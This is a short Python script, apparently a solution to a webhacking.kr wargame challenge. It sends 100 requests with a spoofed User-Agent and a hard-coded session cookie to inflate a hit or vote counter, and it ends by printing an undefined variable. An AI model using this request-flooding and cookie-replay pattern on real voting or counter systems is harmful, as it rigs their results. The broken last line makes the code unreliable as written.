# -*- coding: utf-8 -*-
import urllib.request


user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
session_id = "PHPSESSID=" + "j3isc40110mbef253d8phc3ink"


for i in range(1, 101):
    try:
        url = "https://webhacking.kr/challenge/code-5/?hit=jdk9908"
        print('{:03d}번째 투표중'.format(i))

        req = urllib.request.Request(url)  # 엔터 치기전 상태
        req.add_header('User-agent', user_agent)  # 헤더값 설정(los가 뱉어냄)
        req.add_header("Cookie", session_id)
        res = urllib.request.urlopen(req)  # 엔터누른 효과

    except Exception as e:
        continue

print(answer)
